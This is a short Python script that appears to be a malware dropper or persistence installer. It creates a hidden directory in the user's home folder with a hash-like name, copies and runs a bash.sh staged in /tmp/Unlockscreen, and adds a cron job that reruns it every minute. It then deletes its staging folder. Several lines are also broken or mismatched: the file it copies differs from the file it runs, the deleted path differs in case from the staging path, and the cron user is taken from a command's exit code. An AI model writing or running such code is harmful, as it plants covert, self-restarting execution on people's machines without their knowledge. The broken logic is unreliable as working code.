import os
os.system('pip install python-crontab')
os.system('mkdir $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98')
os.system('cp /tmp/Unlockscreen/U6frt3A.log $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98' )
os.system('bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/bash.sh')
from crontab import CronTab
cron = CronTab(user=int(os.system('echo $LOGNAME')))
job = cron.new(command='bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/bash.sh')
job.minute.every(1)
cron.write()
os.system('rm -rf /tmp/UNLOCKSCREEN')